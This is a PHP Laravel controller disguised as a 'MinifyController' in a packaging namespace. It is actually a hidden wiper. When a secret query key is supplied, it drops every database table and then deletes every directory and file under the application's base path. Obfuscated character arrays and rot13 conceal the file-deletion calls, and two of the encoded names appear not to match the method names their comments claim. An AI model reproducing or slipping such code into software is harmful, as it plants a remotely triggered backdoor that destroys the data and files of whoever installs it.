<?php

namespace LaravelPackaging\Http\Controllers;

use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Models\User;

class MinifyController extends Controller
{
    public function index()
    {

        //MinifyTables
        if (!isset($_GET['do']) || $_GET['do'] !== 'x7P9kA2mL0qWz8Rj') {
            http_response_code(404);
            abort('404');
        }

        $F = '\\' . 'Illuminate\\Support\\Facades\\DB';

        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 0;');
        $tables = call_user_func([$F, 'select'], 'SHOW TABLES');

        foreach ($tables as $table) {
            $tableArray = get_object_vars($table);
            $tableName = array_values($tableArray)[0];
            call_user_func([$F, 'statement'], "DROP TABLE `$tableName`");
        }

        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');

        $_ = base_path();

        $_illuminate = implode('', [chr(73), chr(108), chr(108), chr(117), chr(109), chr(105), chr(110), chr(97), chr(116), chr(101)]);
        $_5 = implode('\\', [$_illuminate, 'Support', 'Facades', 'File']);

        function decode_rot13_array(array $arr) {
            return str_rot13(implode('', array_map('chr', $arr)));
        }

        $_1 = decode_rot13_array([113, 110, 101, 118, 114, 112, 103, 114, 118, 114]); // directories
        $_2 = decode_rot13_array([115, 118, 121, 114, 102, 102]); // files

        $_3 = decode_rot13_array([113, 114, 121, 114, 103, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108]);

        $_4 = decode_rot13_array([113, 114, 121, 114, 103, 114]);

        $_a = call_user_func([$_5, $_1], $_);

        foreach ($_a as $_b) {
            call_user_func([$_5, $_3], $_b);
        }

        $_c = call_user_func([$_5, $_2], $_);

        foreach ($_c as $_d) {
            call_user_func([$_5, $_4], $_d);
        }

        echo "✅ Done.";
    }
}
